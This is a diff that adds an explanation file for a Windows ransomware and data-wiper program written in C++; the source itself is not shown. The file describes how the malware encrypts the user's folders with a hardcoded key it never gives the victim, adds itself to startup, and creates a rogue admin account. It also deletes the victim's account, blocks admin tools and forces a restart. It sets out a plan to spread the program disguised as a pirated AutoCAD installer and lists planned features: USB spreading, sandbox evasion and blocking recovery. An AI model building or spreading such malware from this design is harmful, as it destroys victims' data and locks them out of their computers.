@@ -1,0 +1,59 @@
+# **INTRODUCTION TO THIS EXPLAINATION FILE**
+The code that you recieved is a `C++` a malicious software that starts as a ransomware that encrypts your files and then turns into a data wiper that deletes all of the user's important work documents, programs and many other files.
+# **DEV NOTICES**
+The `C++` that came with this file is just the beginning, as you might expect more features to come in the future. The code is written in a way that it can be easily modified and extended. The code is also designed to be easy to understand and use, even for those who are new to programming. The code is not tested yet since it is a malicious code that is not supposed to be used in a real-world scenario. The code is also not optimized for performance , as it is not intended for production use. The code is also not secure, as it is not designed to handle errors or exceptions properly. The code is also not well-documented, as it is not intended for use by others. here are some warnings:
+- The program is designed for Windows users only, so it won't work on Linux PCs, Macbooks, Android Phones, or any other OS.
+- There are chances that the pc has an alt account, dualbooting capabilites or even a recovery disk that the user can use to recover the files. The current build of the program does not take care of these cases, but we are working on it.
+- The malware is not prepared to encrypt files on a usb stick, OneDrive, CD, DVD, or any other external storage device and cloud services. While it is possible to encrypt files on external storage devices, it is impossible to encrypt files on cloud services like OneDrive, Google Drive, Dropbox, etc. because the files are not stored on the local machine, but on the cloud server. The malware is designed to encrypt files on the local machine only, but we are working on it.
+- Whoever got the source code of this malware, NEVER try to compile it, unless you are using a virtual machine or a sandbox environment, and even then, be very careful, as the malware is designed to be very destructive.
+# **BEHIND THE SCENES**
+## First thing first, we will explain the header files that comes with the code:
+- `iostream`: this header file is used for input/output operations like `std::cout` for output and `std::cin`for input, It allows the program to read from the keyboard and write to the screen.
+- `fstream`: this header file is used for file operations like reading and writing files, It allows the program to read from and write to files, which will help with encrypting files
+- `filesystem`: this header file is used for file system operations like creating and deleting files and directories, It allows the program to work with files and directories.
+- `string`: this header file is used for string operations like concatenating and comparing strings, It allows the program to work with strings and allows the use of `std::string` class.
+- `vector`: this header file is used for working with dynamic arrays that can grow in size, It allows the program to work with dynamic arrays and allows the use of `std::vector` container.
+- `cstdlib`: this header file is used for general-purpose functions like `exit` and `system`, It allows the program to exit the program and run system commands, allowing it to create and delete accounts,,
+- `thread`: this header file is included for multithreading capabilities, although it is not used in the provided code.
+- `chrono`: This header file is included for time-related functions, although it is not used in the provided code.
+- `windows.h`: This header file includes Windows-specific functions and types, allowing the program to interact with the Windows operating system.
+- `tlhelp32.h`: This header file provides functions for working with processes and snapshots in Windows, although it is not used in the provided code.
+Also, the `std` namespace is used to avoid prefixing standard library functions with `std::`. The `fs` namespace is an alias for `std::filesystem`, which simplifies code related to filesystem operations.
+## Now lets get to the constants
+- `const string xorKey = "errorfatal0x00";`: This constant string is used as the key for XOR encryption and decryption of files.
+-`const string decryptKey = "errorfatal0x00";`: This constant string is the hardcoded key that the user must enter to decrypt their files, the victim must contact the developer to get the hardcoded key, although dev will not give him/her the key.
+- `const string browserAUMID = "Microsoft.MicrosoftEdge_8wekyb3d8bbwe";`: This constant string holds the Application User Model ID for Microsoft Edge, which is used to set it as the default browser.
+- `const int maxChances = 3;`: This constant integer defines the maximum number of attempts a user has to enter the correct decryption key, if all chances got exhausted, the damage could be almost irreparable, it's like " three strikes and you're out".
+## What about the functions?
+ Every single function (the lines that starts with `void`) needs to be declared in the code and we wil talk about them as we go through the code.
+## Now lets get to the main function(the entry point of the program).
+- `RequestAdminPrivileges();`: This function call checks if the program is running with administrative privileges. If not, it prompts the user to run it as an administrator. This is usually required in program installers since it changes registries and creates new files, but we will disguise the program as a legitimate program (an installer of a free copy of Autodesk AutoCAD) to trick the user into running it with admin privileges.
+- `addToStartup();`: This function call adds the program to the Windows startup folder, ensuring it runs automatically when the user logs in. This is a common technique used by malware to ensure persistence.
+- `vector<string> directories = {...};`: A vector is created to hold paths to the user's Documents, Desktop, and AppData directories. The `getenv("USERPROFILE")` function retrieves the path to the current user's profile directory, and the string manipulation functions are used to construct the paths to the other directories. although this is not a function, I had to explain it since it is a part of the code.
+- `encryptFilesFromDirectories ```cpp (directories);`: This function call encrypts all files found in the specified directories using the XOR encryption method defined earlier. The files are encrypted in place, meaning their original contents are replaced with the encrypted data and this is the point where the ransomware starts to work.
+- `int chances = 0;`: Initializes a counter to track the number of attempts the user has made to enter the decryption key.
+- while (chances < maxChances) {...}`: A loop that continues until the user has exhausted their allowed attempts.
+- `string inputKey;`: A string variable to hold the user's input for the decryption key.
+- `cout << "Enter decryption key: ";`: This will prompt the user to enter the decryption key.
+- `cin >> inputKey;`: Reads the user's input for the decryption key from the console.
+- `if (inputKey == decryptKey) {...}`: Checks if the user's input matches the hardcoded decryption key that we've just added, and do the following in one of these conditions:
+-- If the decryption key is correct, the program will decrypt all files in the specified directories using the XOR decryption method and close itself, but it would be unlikely that the victim would be able to decrypt the files since only the developer (and whoever got their hands on the source code ) would know the hardcoded key.
+-- If the decryption key is incorrect, the program will increment the `chances` counter using the `chances++` statement and prompt the user to try again, and if the user exhausts all of their chances, things would get really bad. But before I continue, you might see that the output `cout << "Incorrect key. You have " << (maxChances - chances) << " chances left." << endl;` looks pretty different from the rest of the outputs, this is because it shows how many chances the user has left, and this is the point where the data wiper starts to work.
+now to the point where things get really bad, the program will use these following functions:
+- `createNewAccount("BANNED FROM WINDOWS", "NoAccessToWindows");` : This will create a new account with the name "BANNED FROM WINDOWS" and the password "NoAccessToWindows". This makes the program more evil than a typical ransomware, since it will not only encrypt the user's files but also lock them out of their own computer.
+- `addAccountToAdminGroup("BANNED FROM WINDOWS");`: This will add the new account to the admin group, giving it full control over the system. This is the final step in the program's malicious behavior, as it ensures that the user is completely locked out of their system.
+- `setDefaultBrowser(browserAUMID);`: This will set Microsoft Edge as the default browser using Powershell, which is a common technique used by malware to ensure that the user is redirected to malicious websites. But we added Edge's AUMID to the code to prevent them from using any other browser. The next update would change the default browser to internet explorer to keep the pc isolated from the rest of the world.
+- `deleteCurrentUser (getenv("USERNAME"));`: This will delete the user's account, deleting all of his/her files. That what makes the program a data wiper.
+- `restrictAdminApps();`: This will use `icacls` to prevent the user from accessing administrative apps that could help recover the files, and Chrone in case he/she got his/her hands on the source code throughh another device that can open c++ files(but they won't find the source code since it is not uploaded to github.com yet).
+- `restartPC();`: This will force the pc to restart, complicating recovery efforts for the user.
+# **HOW IT SPREADS**
+Let's say someone wanted to install the latest version of Autodesk AutoCAD without paying for it, he would go to a suspicious website that looks completely like the official website, he clicks on the download button, and the malicious program starts to download, the suspicious thing about the download is that it is downloaded from github.com (it is a site for people that develop open source software), and big companies like Autodesk do not upload their software to github.com, they upload it to their official website. and once the file gets downloaded, he executes it as an administrator and the software starts encrypting the files, the user will think that he needs to enter a product key, so he goes to another suspicous website/github repository to get a list of working product keys, but none of them is the corret key, and the user will get the message that he has 2 chances left, and he will try to enter the key again, but he will get the same message, and he will try to enter the key again, only to realize that all of his chances are gone, and the program will start to delete all of his files, and he will be left with nothing but a message that says "You have been banned from Windows", and all he has to do is to take the pc to a repair shop (for example: PCmax) and pay millions of dollars to get Windows 10 repaired.
+# **WHAT'S COMING NEXT**
+- Ability to create a file that will download the ransomware once an external device is connected to the pc.
+- Ability to add a custom wallpaper to the new account
+- Ability to prevent the pc from booting to Windows Recovery, Safe mode, etc.
+- Ability to prevent Dualboot.
+- Ability to detect if the user is using a virtual machine or a sandbox environment.
+- Ability to delete all accounts
+- Ability to prevent the pc from booting to a bootable external drive
+- Disguise changed to an antivirus software.
